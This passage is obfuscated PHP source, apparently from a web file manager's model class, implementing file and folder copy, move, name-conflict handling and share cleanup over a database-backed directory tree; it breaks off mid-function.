$é­êÏ“ì ? $é­êÏ“ì : $ºÏÉõ¼À[$ãĞ£şí [32]]; $¼È¬“Ñ = $this->fileNameExistAuto($ƒØµİìÙ, $ºÏÉõ¼À); if ($ÄàÃŠÉ­) { $this->_childrenAllMake($­Ÿ¬Õï‚); if ($ä¨¶ı·ğ && $¼È¬“Ñ) { $this->_childrenAllMake($¼È¬“Ñ); } } if (!$¼È¬“Ñ) { return $this->_copyCreate($­Ÿ¬Õï‚, $ƒØµİìÙ, $àµ©§Æ€, $šòÅï¿ã); } $Ÿù¾Ö§’ = $¼È¬“Ñ; if ($ä¨¶ı·ğ) { if ($²­Ò¶´ == REPEAT_RENAME_FOLDER) { $àµ©§Æ€ = $this->fileNameAutoCache($ƒØµİìÙ, $àµ©§Æ€, $²­Ò¶´, $ä¨¶ı·ğ); $Ÿù¾Ö§’ = $this->_copyCreate($­Ÿ¬Õï‚, $ƒØµİìÙ, $àµ©§Æ€, $šòÅï¿ã); } else { $ù†¸ï¡‹ = $this->_childrenList($­Ÿ¬Õï‚); foreach ($ù†¸ï¡‹ as $Ş’ø “ù) { $this->_copy($Ş’ø “ù[$ãĞ£şí [194]], $¼È¬“Ñ, $²­Ò¶´, $šòÅï¿ã, !1); } } } else { if ($²­Ò¶´ == REPEAT_RENAME || $²­Ò¶´ == REPEAT_RENAME_FOLDER) { $àµ©§Æ€ = $this->fileNameAutoCache($ƒØµİìÙ, $àµ©§Æ€, $²­Ò¶´, $ä¨¶ı·ğ); $Ÿù¾Ö§’ = $this->_copyCreate($­Ÿ¬Õï‚, $ƒØµİìÙ, $àµ©§Æ€, $šòÅï¿ã); } else { if ($²­Ò¶´ == REPEAT_REPLACE) { $ï€ÌÉ­ = $this->sourceInfoCache($¼È¬“Ñ); $Ò¯¯Ìõ´ = $this->fileHistory($ï€ÌÉ­, $ºÏÉõ¼À[$ãĞ£şí [554]], $ºÏÉõ¼À[$ãĞ£şí [79]]); if ($Ò¯¯Ìõ´) { $šòÅï¿ã[$ãĞ£şí [645]][] = $ºÏÉõ¼À[$ãĞ£şí [554]]; } } else { if ($²­Ò¶´ == REPEAT_SKIP) { } } } Hook::trigger($ãĞ£şí [650], array($ãĞ£şí [651], $ºÏÉõ¼À, 0)); } return $Ÿù¾Ö§’; } private function _copyCreate($æœÒˆíÉ, $şı‘­š€, $¬À¶¼Àû, &$¢Ø…‰ö™) { $¥¦Á‰Ô® =& $_SERVER[äô®•½Â]; $şëŠˆ¨¸ = $this->sourceInfoCache($æœÒˆíÉ); $ş„˜È¤Â = $this->sourceInfoCache($şı‘­š€); $¦“‡Ô§» = $this->_makeItemData($şëŠˆ¨¸, $ş„˜È¤Â, $¬À¶¼Àû); Hook::trigger($¥¦Á‰Ô®[652], $¦“‡Ô§»); Hook::trigger($¥¦Á‰Ô®[653], array($¥¦Á‰Ô®[654], $¦“‡Ô§», 0)); $˜ÌÂÖ¿ò = $this->add($¦“‡Ô§»); $à¸õ¨™ = array($¥¦Á‰Ô®[194] => $˜ÌÂÖ¿ò, $¥¦Á‰Ô®[32] => $¬À¶¼Àû); $this->_copyApplyMeta($à¸õ¨™, $¢Ø…‰ö™); if ($şëŠˆ¨¸[$¥¦Á‰Ô®[496]] != $¥¦Á‰Ô®[91]) { $¢Ø…‰ö™[$¥¦Á‰Ô®[645]][] = $şëŠˆ¨¸[$¥¦Á‰Ô®[554]]; return $˜ÌÂÖ¿ò; } $Úóñã€Ä = array(); $–¬Õ›Úç = array(); $this->_childrenListAll($æœÒˆíÉ, $Úóñã€Ä); $«»áÁÀ‡ = count($Úóñã€Ä); if ($«»áÁÀ‡ == 0) { return $˜ÌÂÖ¿ò; } $¼Îƒ¥Ò = $this->sourceInfo($˜ÌÂÖ¿ò); foreach ($Úóñã€Ä as $ÑÑ¸¥¤ë) { $–ãòï¼é = $this->_makeItemData($ÑÑ¸¥¤ë, $¼Îƒ¥Ò, $ÑÑ¸¥¤ë[$¥¦Á‰Ô®[32]]); $–ãòï¼é[$¥¦Á‰Ô®[597]] = $ÑÑ¸¥¤ë[$¥¦Á‰Ô®[597]]; $–¬Õ›Úç[] = $–ãòï¼é; } $this->chunkEventSet($¥¦Á‰Ô®[655], array($¥¦Á‰Ô®[656], $¦“‡Ô§», $«»áÁÀ‡)); $this->addAll($–¬Õ›Úç, array(), !1); $›ò¤‡Šˆ = $this->where(array($¥¦Á‰Ô®[193] => $˜ÌÂÖ¿ò))->select(); $úˆ“äÕ = $this->_childrenMakeRelation($Úóñã€Ä, $›ò¤‡Šˆ); $úˆ“äÕ[$æœÒˆíÉ] = $˜ÌÂÖ¿ò; $†ïîÎª = array(); $„Ö‹Áİ± = array(); foreach ($›ò¤‡Šˆ as $ÑÑ¸¥¤ë) { $óÏ»‰•Ğ = $ÑÑ¸¥¤ë[$¥¦Á‰Ô®[194]]; $×Äû»Øû = $this->_childrenMatch($úˆ“äÕ, $ÑÑ¸¥¤ë, $¼Îƒ¥Ò); $†ïîÎª[] = array($¥¦Á‰Ô®[194], $óÏ»‰•Ğ, $¥¦Á‰Ô®[193], $×Äû»Øû[$¥¦Á‰Ô®[193]]); $„Ö‹Áİ±[] = array($¥¦Á‰Ô®[194], $óÏ»‰•Ğ, $¥¦Á‰Ô®[597], $×Äû»Øû[$¥¦Á‰Ô®[597]]); $this->_copyApplyMeta($ÑÑ¸¥¤ë, $¢Ø…‰ö™); if ($ÑÑ¸¥¤ë[$¥¦Á‰Ô®[496]] != $¥¦Á‰Ô®[91]) { $¢Ø…‰ö™[$¥¦Á‰Ô®[645]][] = $ÑÑ¸¥¤ë[$¥¦Á‰Ô®[554]]; } } $this->chunkEventSet($¥¦Á‰Ô®[657], array($¥¦Á‰Ô®[658], $¦“‡Ô§», $«»áÁÀ‡)); $this->saveAll($†ïîÎª); $this->chunkEventSet($¥¦Á‰Ô®[659], array($¥¦Á‰Ô®[660], $¦“‡Ô§», $«»áÁÀ‡)); $this->saveAll($„Ö‹Áİ±); return $˜ÌÂÖ¿ò; } private function _childrenMakeRelation($Ÿ ëÚÈ´, $¡ŒÙÙûÁ) { $Ñ¨ÃØÁš =& $_SERVER[äô®•½Â]; $×¸ª°Óº = array(); $š×¥Í‚À = array(); foreach ($Ÿ ëÚÈ´ as $Ã£Ìê÷ö) { $ ¾˜ÓÌÖ = $Ã£Ìê÷ö[$Ñ¨ÃØÁš[32]] . $Ñ¨ÃØÁš[8] . $Ã£Ìê÷ö[$Ñ¨ÃØÁš[597]]; $×¸ª°Óº[$ ¾˜ÓÌÖ] = $Ã£Ìê÷ö[$Ñ¨ÃØÁš[194]]; } foreach ($¡ŒÙÙûÁ as $Ã£Ìê÷ö) { $ ¾˜ÓÌÖ = $Ã£Ìê÷ö[$Ñ¨ÃØÁš[32]] . $Ñ¨ÃØÁš[8] . $Ã£Ìê÷ö[$Ñ¨ÃØÁš[597]]; $ï÷ª…¸ğ = $×¸ª°Óº[$ ¾˜ÓÌÖ]; $š×¥Í‚À[$ï÷ª…¸ğ] = $Ã£Ìê÷ö[$Ñ¨ÃØÁš[194]]; } return $š×¥Í‚À; } private function _childrenMatch($Îóš•Æ£, $ä¶‹ê£, $ğ´Ø„¹”) { $íæ÷Öí¶ =& $_SERVER[äô®•½Â]; $øïƒÄ÷ = $ğ´Ø„¹”[$íæ÷Öí¶[597]]; $¡óÂ¡Û¿ = $this->parentLevelArray($ä¶‹ê£[$íæ÷Öí¶[597]]); foreach ($¡óÂ¡Û¿ as $â¨¸¾£«) { if (isset($Îóš•Æ£[$â¨¸¾£«])) { $øïƒÄ÷ .= $Îóš•Æ£[$â¨¸¾£«] . $íæ÷Öí¶[661]; } } $øïƒÄ÷ = rtrim($øïƒÄ÷, $íæ÷Öí¶[50]) . $íæ÷Öí¶[50]; $İó îğ¢ = $this->parentLevelArray($øïƒÄ÷); $­çÂŸçô = $İó îğ¢[count($İó îğ¢) - 1]; return array($íæ÷Öí¶[193] => $­çÂŸçô, $íæ÷Öí¶[597] => $øïƒÄ÷); } private function _makeItemData($ô®Œ€÷Š, $Á›Î•ëœ, $ÒÌØÊ™È) { $Æ²¤º =& $_SERVER[äô®•½Â]; $€İØ²ò = array($Æ²¤º[662] => $ô®Œ€÷Š[$Æ²¤º[496]], $Æ²¤º[505] => $ÒÌØÊ™È, $Æ²¤º[663] => $ô®Œ€÷Š[$Æ²¤º[497]] ? $ô®Œ€÷Š[$Æ²¤º[497]] : $Æ²¤º[12], $Æ²¤º[555] => $ô®Œ€÷Š[$Æ²¤º[554]] ? $ô®Œ€÷Š[$Æ²¤º[554]] : 0, $Æ²¤º[633] => $ô®Œ€÷Š[$Æ²¤º[79]] ? $ô®Œ€÷Š[$Æ²¤º[79]] : 0, $Æ²¤º[664] => intval($Á›Î•ëœ[$Æ²¤º[191]]), $Æ²¤º[665] => intval($Á›Î•ëœ[$Æ²¤º[582]]), $Æ²¤º[666] => intval(USER_ID), $Æ²¤º[667] => intval(USER_ID), $Æ²¤º[488] => intval($Á›Î•ëœ[$Æ²¤º[194]]), $Æ²¤º[668] => $Á›Î•ëœ[$Æ²¤º[597]] . $Á›Î•ëœ[$Æ²¤º[194]] . $Æ²¤º[50], $Æ²¤º[509] => $ô®Œ€÷Š[$Æ²¤º[88]] ? $ô®Œ€÷Š[$Æ²¤º[88]] : time(), $Æ²¤º[515] => 0, $Æ²¤º[669] => $Æ²¤º[12]); return $€İØ²ò; } private function _copyApplyMeta($ÑËª˜§—, &$òÈ×îµ) { $óÊó¯˜ã =& $_SERVER[äô®•½Â]; $‡õŒ¹¯Ò = $ÑËª˜§—[$óÊó¯˜ã[194]]; $¯€Ìõ¦Ê = $ÑËª˜§—[$óÊó¯˜ã[32]]; if (!isset($ÑËª˜§—[$óÊó¯˜ã[670]]) || !$ÑËª˜§—[$óÊó¯˜ã[670]] || $ÑËª˜§—[$óÊó¯˜ã[670]] == $óÊó¯˜ã[231]) { $òÈ×îµ[$óÊó¯˜ã[647]][] = array($óÊó¯˜ã[194], $‡õŒ¹¯Ò, $óÊó¯˜ã[670], short_id($‡õŒ¹¯Ò)); } if (Input::check($¯€Ìõ¦Ê, $óÊó¯˜ã[671])) { $òÈ×îµ[$óÊó¯˜ã[646]][] = array($óÊó¯˜ã[194] => $‡õŒ¹¯Ò, $óÊó¯˜ã[97] => $óÊó¯˜ã[549], $óÊó¯˜ã[461] => str_replace($óÊó¯˜ã[53], $óÊó¯˜ã[12], Pinyin::get($¯€Ìõ¦Ê))); $òÈ×îµ[$óÊó¯˜ã[646]][] = array($óÊó¯˜ã[194] => $‡õŒ¹¯Ò, $óÊó¯˜ã[97] => $óÊó¯˜ã[548], $óÊó¯˜ã[461] => Pinyin::get($¯€Ìõ¦Ê, $óÊó¯˜ã[672])); } $òÈ×îµ[$óÊó¯˜ã[646]][] = array($óÊó¯˜ã[194] => $‡õŒ¹¯Ò, $óÊó¯˜ã[97] => $óÊó¯˜ã[528], $óÊó¯˜ã[461] => KodSort::makeStr($¯€Ìõ¦Ê)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($íàáşÕŸ) { $ƒÍİ“Ùá =& $_SERVER[äô®•½Â]; $Û—ƒ÷â = $this->sourceInfo($íàáşÕŸ); $İøñ¥úÆ = $ƒÍİ“Ùá[673]; $‹²©İêÆ = array($ƒÍİ“Ùá[597] => array($ƒÍİ“Ùá[628], $Û—ƒ÷â[$ƒÍİ“Ùá[597]] . $íàáşÕŸ . $ƒÍİ“Ùá[629]), $ƒÍİ“Ùá[516] => $this->targetIsDelete); $Ùàœİ»Á = $this->field($İøñ¥úÆ)->where($‹²©İêÆ)->select(); if (!$Ùàœİ»Á) { return; } $Ùàœİ»Á = array_to_keyvalue($Ùàœİ»Á, $ƒÍİ“Ùá[194]); foreach ($Ùàœİ»Á as $û¾ª§öŸ) { $ÉŸÊ†¼Ä = $û¾ª§öŸ[$ƒÍİ“Ùá[193]]; $íàáşÕŸ = $û¾ª§öŸ[$ƒÍİ“Ùá[194]]; if (!isset($this->_childrenListCache[$íàáşÕŸ]) && $û¾ª§öŸ[$ƒÍİ“Ùá[496]] == $ƒÍİ“Ùá[91]) { $this->_childrenListCache[$íàáşÕŸ] = array(); } if (!isset($this->_childrenListCache[$ÉŸÊ†¼Ä])) { $this->_childrenListCache[$ÉŸÊ†¼Ä] = array(); } $this->_childrenListCache[$ÉŸÊ†¼Ä][$íàáşÕŸ] = $û¾ª§öŸ; $this->_childrenItemCache[$íàáşÕŸ] = $û¾ª§öŸ; } } private function _childrenListAll($î™Ôâœí, &$Â…¹œÛï) { $£®È°¯é =& $_SERVER[äô®•½Â]; if (!isset($this->_childrenListCache[$î™Ôâœí])) { return; } $ùä’¯…ã = $this->_childrenListCache[$î™Ôâœí]; foreach ($ùä’¯…ã as $Â´˜¥é² => $õĞ¿ĞòÓ) { $Â…¹œÛï[$Â´˜¥é²] = $õĞ¿ĞòÓ; if ($õĞ¿ĞòÓ[$£®È°¯é[496]] == $£®È°¯é[91]) { $this->_childrenListAll($Â´˜¥é², $Â…¹œÛï); } } } private function sourceInfoCache($›¢ÅŸÂí) { if (isset($this->_childrenItemCache[$›¢ÅŸÂí])) { return $this->_childrenItemCache[$›¢ÅŸÂí]; } return $this->sourceInfo($›¢ÅŸÂí); } private function _childrenList($óÖ€•¿) { if (isset($this->_childrenListCache[$óÖ€•¿])) { return $this->_childrenListCache[$óÖ€•¿]; } return $this->_childrenListSelect($óÖ€•¿); } private function _childrenListSelect($ÍŒ’Èï§) { $—Ú»åœ =& $_SERVER[äô®•½Â]; $Ç†­ñ÷ò = array($—Ú»åœ[193] => $ÍŒ’Èï§, $—Ú»åœ[516] => $this->targetIsDelete); $·³óÂ…„ = $this->where($Ç†­ñ÷ò)->select(); $·³óÂ…„ = $·³óÂ…„ ? $·³óÂ…„ : array(); $Í‡·º  = array_to_keyvalue($·³óÂ…„, $—Ú»åœ[194]); $this->_childrenListCache[$ÍŒ’Èï§] = $Í‡·º ; foreach ($Í‡·º  as $ÍŒ’Èï§ => $ª×ï‰ÍÎ) { $this->_childrenItemCache[$ÍŒ’Èï§] = $ª×ï‰ÍÎ; } return $Í‡·º ; } private function fileNameExistAuto($á¦—ô–İ, $¦çİ®ÇÓ) { $éœİ‚ŸÉ =& $_SERVER[äô®•½Â]; if ($¦çİ®ÇÓ[$éœİ‚ŸÉ[516]] == $éœİ‚ŸÉ[91]) { return $this->fileNameExist($á¦—ô–İ, $¦çİ®ÇÓ[$éœİ‚ŸÉ[32]]); } return $this->fileNameExistCache($á¦—ô–İ, $¦çİ®ÇÓ[$éœİ‚ŸÉ[32]]); } private function fileNameExistCache($ÄĞ‚µô, $‘ÏšÎã®) { $ßÊÙûúï =& $_SERVER[äô®•½Â]; $‘ÏšÎã® = strtolower($‘ÏšÎã®); $–âÈ©İà = $this->_childrenList($ÄĞ‚µô); foreach ($–âÈ©İà as $…´ıŞ‡) { if ($‘ÏšÎã® == strtolower($…´ıŞ‡[$ßÊÙûúï[32]])) { return $…´ıŞ‡[$ßÊÙûúï[194]]; } } return !1; } private function fileNameAutoCache($ı¹„Ã³Î, $¢‘óÄ•, $‚Ùê¯´˜, $ÌŞŸ¸®ß) { $Ğ“‚Ú‡ô =& $_SERVER[äô®•½Â]; $ëåâ¹âÑ = $this->_childrenList($ı¹„Ã³Î); $ïë²˜Ó« = array_to_keyvalue($ëåâ¹âÑ, $Ğ“‚Ú‡ô[12], $Ğ“‚Ú‡ô[32]); return $this->fileNameAutoGet($ïë²˜Ó«, $¢‘óÄ•, $‚Ùê¯´˜, $ÌŞŸ¸®ß); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($œšÌÄ—”, $”¤ş¹Ÿ†, $öáØ ßÃ = REPEAT_REPLACE, $ç°¥Ş»„ = '') { $°ˆ”Å¦ù =& $_SERVER[äô®•½Â]; $÷ßç´ = $this->sourceInfo($œšÌÄ—”); $íÃó©É… = $this->sourceInfo($”¤ş¹Ÿ†); if ($÷ßç´[$°ˆ”Å¦ù[193]] == $íÃó©É…[$°ˆ”Å¦ù[194]]) { if ($÷ßç´[$°ˆ”Å¦ù[516]] == $°ˆ”Å¦ù[91]) { Model($°ˆ”Å¦ù[514])->restore(array($œšÌÄ—”)); } if (!$ç°¥Ş»„ || $ç°¥Ş»„ == $÷ßç´[$°ˆ”Å¦ù[32]]) { return $œšÌÄ—”; } } $¯’ŠĞ· = $this->pathInfoMore($œšÌÄ—”); if ($this->isParentOf($œšÌÄ—”, $”¤ş¹Ÿ†)) { return !1; } if (!$÷ßç´ || !$íÃó©É… || $íÃó©É…[$°ˆ”Å¦ù[496]] != $°ˆ”Å¦ù[91]) { return !1; } Hook::trigger($°ˆ”Å¦ù[674], $¯’ŠĞ·); $this->targetIsDelete = intval($÷ßç´[$°ˆ”Å¦ù[516]]); if ($÷ßç´[$°ˆ”Å¦ù[193]] == $”¤ş¹Ÿ† && $ç°¥Ş»„ != $÷ßç´[$°ˆ”Å¦ù[32]]) { $×øµÕ³× = $this->fileNameExist($”¤ş¹Ÿ†, $ç°¥Ş»„); if ($×øµÕ³× && $÷ßç´[$°ˆ”Å¦ù[496]] == $°ˆ”Å¦ù[231]) { $‚¸û×‹µ = $this->sourceInfo($×øµÕ³×); $Õ¢³Ôœ• = $this->fileHistory($‚¸û×‹µ, $÷ßç´[$°ˆ”Å¦ù[554]], $÷ßç´[$°ˆ”Å¦ù[79]]); if (!$Õ¢³Ôœ•) { Model($°ˆ”Å¦ù[557])->remove($÷ßç´[$°ˆ”Å¦ù[554]]); } $this->removeNow($œšÌÄ—”, !1); $this->folderSizeReset($”¤ş¹Ÿ†); Hook::trigger($°ˆ”Å¦ù[675], $¯’ŠĞ·); return $×øµÕ³×; } } $¬’¢·Õğ = $ç°¥Ş»„ ? $ç°¥Ş»„ : $÷ßç´[$°ˆ”Å¦ù[32]]; $this->lockMoveStart($œšÌÄ—”); $this->lockWriteStart($”¤ş¹Ÿ†, $¬’¢·Õğ); $é„‹ĞÄ¬ = array($°ˆ”Å¦ù[645] => array(), $°ˆ”Å¦ù[676] => !1); $this->clearShare($œšÌÄ—”, $”¤ş¹Ÿ†); $Á›ó×¼Ñ = $this->fileNameExistAuto($”¤ş¹Ÿ†, $÷ßç´); $ÌÜãßÍ = $this->_move($œšÌÄ—”, $”¤ş¹Ÿ†, $öáØ ßÃ, $é„‹ĞÄ¬, $ç°¥Ş»„); $this->sourceCacheClear(); if ($÷ßç´[$°ˆ”Å¦ù[496]] == $°ˆ”Å¦ù[91] && $Á›ó×¼Ñ) { $this->folderSizeResetChildren($ÌÜãßÍ); } Model($°ˆ”Å¦ù[233])->linkAdd($é„‹ĞÄ¬[$°ˆ”Å¦ù[645]]); if ($ÌÜãßÍ && $Á›ó×¼Ñ && $é„‹ĞÄ¬[$°ˆ”Å¦ù[676]]) { $½¾³à«Ù = $÷ßç´[$°ˆ”Å¦ù[496]] == $°ˆ”Å¦ù[91] ? $this->_childrenListSelect($œšÌÄ—”) : !1; $—æ¤£Êİ = $½¾³à«Ù && count($½¾³à«Ù) > 0 ? !0 : !1; $this->removeNow($œšÌÄ—”, $—æ¤£Êİ); } $this->lockMoveEnd($œšÌÄ—”); $this->lockWriteEnd($”¤ş¹Ÿ†, $¬’¢·Õğ); $this->folderSizeReset($÷ßç´[$°ˆ”Å¦ù[193]]); $this->folderSizeReset($”¤ş¹Ÿ†); $ô‰Ü¥Ûô = array($÷ßç´[$°ˆ”Å¦ù[193]], $”¤ş¹Ÿ†); if ($÷ßç´[$°ˆ”Å¦ù[496]] == $°ˆ”Å¦ù[91]) { $ô‰Ü¥Ûô[] = $œšÌÄ—”; } $this->updateModifyTime($ô‰Ü¥Ûô); Model($°ˆ”Å¦ù[649])->eventMove($œšÌÄ—”, $÷ßç´[$°ˆ”Å¦ù[193]], $”¤ş¹Ÿ†); Hook::trigger($°ˆ”Å¦ù[675], $¯’ŠĞ·); return $ÌÜãßÍ; } private function _move($á™µ«Ù¯, $…ò¥åĞÌ, $¸Á¿¡Úº, &$†Å«²¨Ò, $¿¨õìµ´ = '') { $©ªò›’ =& $_SERVER[äô®•½Â]; $ö„¿Èù› = $this->sourceInfo($á™µ«Ù¯); $ç‡óõØÎ = $ö„¿Èù›[$©ªò›’[496]] == $©ªò›’[91]; $ÍğË€â = $¿¨õìµ´ ? $¿¨õìµ´ : $ö„¿Èù›[$©ªò›’[32]]; $½—¶Ğ‹ñ = $this->fileNameExistAuto($…ò¥åĞÌ, $ö„¿Èù›); $this->lockMoveStart($á™µ«Ù¯); $this->lockWriteStart($…ò¥åĞÌ, $ÍğË€â); if (!$½—¶Ğ‹ñ) { return $this->_moveForce($á™µ«Ù¯, $…ò¥åĞÌ, $ÍğË€â); } $·ØŸ°ûµ = $½—¶Ğ‹ñ; $»åÚô¡ú = !1; if ($ç‡óõØÎ) { if ($¸Á¿¡Úº == REPEAT_RENAME_FOLDER) { $ÍğË€â = $this->fileNameAuto($…ò¥åĞÌ, $ÍğË€â, $¸Á¿¡Úº, $ç‡óõØÎ); $·ØŸ°ûµ = $this->_moveForce($á™µ«Ù¯, $…ò¥åĞÌ, $ÍğË€â); } else { $øáÛÀğÖ = $this->_childrenListSelect($á™µ«Ù¯); foreach ($øáÛÀğÖ as $ÓË¡”Û¦) { $€ô¼Á™Ï = REPEAT_REPLACE; $this->_move($ÓË¡”Û¦[$©ªò›’[194]], $½—¶Ğ‹ñ, $€ô¼Á™Ï, $†Å«²¨Ò); } $»åÚô¡ú = !0; } } else { if ($¸Á¿¡Úº == REPEAT_RENAME || $¸Á¿¡Úº == REPEAT_RENAME_FOLDER) { $ÍğË€â = $this->fileNameAuto($…ò¥åĞÌ, $ÍğË€â, $¸Á¿¡Úº, $ç‡óõØÎ); $·ØŸ°ûµ = $this->_moveForce($á™µ«Ù¯, $…ò¥åĞÌ, $ÍğË€â); } else { $¶Æ‹Ñœ = $this->sourceInfoCache($½—¶Ğ‹ñ); $Ã¹«ÑÂç = $this->fileHistory($¶Æ‹Ñœ, $ö„¿Èù›[$©ªò›’[554]], $ö„¿Èù›[$©ªò›’[79]]); if ($Ã¹«ÑÂç) { $†Å«²¨Ò[$©ªò›’[645]][] = $ö„¿Èù›[$©ªò›’[554]]; } $»åÚô¡ú = !0; } } if ($»åÚô¡ú) { $†Å«²¨Ò[$©ªò›’[676]] = !0; } return $·ØŸ°ûµ; } private function _moveForce($å¬ÕÜî´, $®µ´‰´¨, $òÔ£”ü„) { $œ¾öµœÍ =& $_SERVER[äô®•½Â]; $Å°«…ì = $this->sourceInfo($å¬ÕÜî´); $®úºî™ = $this->sourceInfo($®µ´‰´¨); $¸Û¨æ¦˜ = $Å°«…ì[$œ¾öµœÍ[496]] == $œ¾öµœÍ[91]; $çÆÊ™Ô• = array($œ¾öµœÍ[488] => $®úºî™[$œ¾öµœÍ[194]], $œ¾öµœÍ[668] => $®úºî™[$œ¾öµœÍ[597]] . $®úºî™[$œ¾öµœÍ[194]] . $œ¾öµœÍ[50], $œ¾öµœÍ[664] => $®úºî™[$œ¾öµœÍ[191]], $œ¾öµœÍ[665] => $®úºî™[$œ¾öµœÍ[582]], $œ¾öµœÍ[667] => USER_ID, $œ¾öµœÍ[505] => $òÔ£”ü„); $ÒÌºÑË = $Å°«…ì[$œ¾öµœÍ[191]] == SourceModel::TYPE_GROUP && $®úºî™[$œ¾öµœÍ[191]] == SourceModel::TYPE_GROUP && $Å°«…ì[$œ¾öµœÍ[582]] == $®úºî™[$œ¾öµœÍ[582]]; if (!$ÒÌºÑË && $this->moveClearAuth) { Model($œ¾öµœÍ[580])->authClear($å¬ÕÜî´); } $Î®ø«Ã¼ = $Å°«…ì[$œ¾öµœÍ[516]] == $œ¾öµœÍ[91] && $®úºî™[$œ¾öµœÍ[516]] != $œ¾öµœÍ[91]; if ($Î®ø«Ã¼) { $çÆÊ™Ô•[$œ¾öµœÍ[515]] = 0; } if ($¸Û¨æ¦˜) { $ÅŸÍ„ = array($œ¾öµœÍ[668] => array($œ¾öµœÍ[628], $Å°«…ì[$œ¾öµœÍ[597]] . $Å°«…ì[$œ¾öµœÍ[194]] . $œ¾öµœÍ[629])); $¡½ä°ùö = $Å°«…ì[$œ¾öµœÍ[597]] . $Å°«…ì[$œ¾öµœÍ[194]] . $œ¾öµœÍ[50]; $çğú¦œ = $®úºî™[$œ¾öµœÍ[597]] . $®úºî™[$œ¾öµœÍ[194]] . $œ¾öµœÍ[50] . $Å°«…ì[$œ¾öµœÍ[194]] . $œ¾öµœÍ[50]; $Çøù¡êã = array($œ¾öµœÍ[668] => array($œ¾öµœÍ[677], "\162\145\160\154\141\143\145\50\x70\x61\x72\x65\x6e\x74\114\145\166\145\154\54\x27{$¡½ä°ùö}\x27\x2c\47{$çğú¦œ}\x27\51"), $œ¾öµœÍ[664] => $®úºî™[$œ¾öµœÍ[191]], $œ¾öµœÍ[665] => $®úºî™[$œ¾öµœÍ[582]]); if ($Î®ø«Ã¼) { $Çøù¡êã[$œ¾öµœÍ[515]] = 0; } $this->where($ÅŸÍ„)->data($Çøù¡êã)->save(); } $this->where(array($œ¾öµœÍ[502] => $å¬ÕÜî´))->data($çÆÊ™Ô•)->save(); return $å¬ÕÜî´; } private function clearShare($œñÙá†Å, $‰Á©„ø) { $ÀŠ¬„²¤ =& $_SERVER[äô®•½Â]; $¹“ë¬†¨ = $this->sourceInfo($œñÙá†Å); $©÷ÆÙÒ = $this->sourceInfo($‰Á©„ø); if ($¹“ë¬†¨[$ÀŠ¬„²¤[582]] == $©÷ÆÙÒ[$ÀŠ¬„²¤[582]] && $¹“ë¬†¨[$ÀŠ¬„²¤[191]] == $ÀŠ¬„²¤[678]) { return; } $³ÆšËƒ¼ = array($ÀŠ¬„²¤[597] => array($ÀŠ¬„²¤[628], $¹“ë¬†¨[$ÀŠ¬„²¤[597]] . $œñÙá†Å . $ÀŠ¬„²¤[629])); $õ¤èëÇš = $this->field($ÀŠ¬„²¤[502])->where($³ÆšËƒ¼)->getField($ÀŠ¬„²¤[194], !0); if (!$õ¤èëÇš) { return; } $³ÆšËƒ¼ = array($ÀŠ¬„²¤[194] => array($ÀŠ¬„²¤[7], $õ¤èëÇš), $ÀŠ¬„²¤[679] => 1); $İÊËìé™ = Model($ÀŠ¬„²¤[680])->field($ÀŠ¬„²¤[681])->where($³ÆšËƒ¼)->select(); if (!$İÊËìé™) { return; } $İÊËìé™ = array_to_keyvalue($İÊËìé™, $ÀŠ¬„²¤[12], $ÀŠ¬„²¤[681]); $³ÆšËƒ¼ = array($ÀŠ¬„²¤[681] => array($ÀŠ¬„²¤[7], $İÊËìé™)); Model($ÀŠ¬„²¤[680])->where($³ÆšËƒ¼)->save(array($ÀŠ¬„²¤[679] => 0)); Model($ÀŠ¬„²¤[682])->where($³ÆšËƒ¼)->delete(); } public function copyFolderFromIO($Å¤Æ¢›é, $üÎ°£—³, $í£Úõ…, $ÇãÉÙó, $—üúŸÄµ, $ÈÄ²ÅƒŸ = false) { $’ì©‘±· =& $_SERVER[äô®•½Â]; $«î¿´êÑ = array($’ì©‘±·[646] => array(), $’ì©‘±·[647] => array(), $’ì©‘±·[645] => array(), $’ì©‘±·[683] => array()); $Û—ÚÏ—Ü = $ÈÄ²ÅƒŸ ? $ÈÄ²ÅƒŸ : $Å¤Æ¢›é->pathThis($üÎ°£—³); $‚Â´ Ùë = $this->fileNameExist($í£Úõ…, $Û—ÚÏ—Ü); $òü½Ö“í = $this->mkdir($í£Úõ…, $Û—ÚÏ—Ü, $ÇãÉÙó); if (!$‚Â´ Ùë || $ÇãÉÙó == REPEAT_RENAME_FOLDER) { $ÇãÉÙó = !1; } if ($‚Â´ Ùë) { $this->_childrenAllMake($‚Â´ Ùë); } Hook::trigger($’ì©‘±·[684]); $·ûÏİÜµ = KodIO::ioFileDriverGet($’ì©‘±·[494] . $í£Úõ… . $’ì©‘±·[413]); $this->_copyChildTo($Å¤Æ¢›é, $üÎ°£—³, $òü½Ö“í, $ÇãÉÙó, $«î¿´êÑ, $—üúŸÄµ, $·ûÏİÜµ); Hook::trigger($’ì©‘±·[685]); if ($òü½Ö“í) { $this->folderSizeResetChildren($òü½Ö“í); } $this->_childrenListClear(); Model($’ì©‘±·[648])->addAll($«î¿´êÑ[$’ì©‘±·[646]], array(), !0); Model($’ì©‘±·[649])->eventCopy($òü½Ö“í); $this->saveAll($«î¿´êÑ[$’ì©‘±·[647]]); Model($’ì©‘±·[557])->linkAdd($«î¿´êÑ[$’ì©‘±·[645]]); Model($’ì©‘±·[557])->remove($«î¿´êÑ[$’ì©‘±·[683]]); $this->folderSizeReset($í£Úõ…); $this->updateModifyTime($í£Úõ…); return $òü½Ö“í; } private function _copyChildTo($ˆ°¡ÂÚÚ, $‡™ãß¥Í, $Ôšğ¶õğ, $¦Êèµ©ô, &$êÖì×ìÇ, $®‚Äˆ”×, $úéÈÚ“î) { $…ì§‹ö =& $_SERVER[äô®•½Â]; $±´»ÜĞ = $this->sourceInfoCache($Ôšğ¶õğ); $âˆÜ´á¡ = $ˆ°¡ÂÚÚ->listPath($‡™ãß¥Í); $âˆÜ´á¡ = $âˆÜ´á¡ ? $âˆÜ´á¡ : array($…ì§‹ö[86] => array(), $…ì§‹ö[85] => array()); $ñç°˜¢ = array_merge($âˆÜ´á¡[$…ì§‹ö[86]], $âˆÜ´á¡[$…ì§‹ö[85]]); $®£ª† = $this->_addFiles($ˆ°¡ÂÚÚ, $úéÈÚ“î, $âˆÜ´á¡[$…ì§‹ö[86]], $®‚Äˆ”×); $Ë„ÎŠ¥– = array(); foreach ($ñç°˜¢ as &$ó¯ôË•Õ) { if 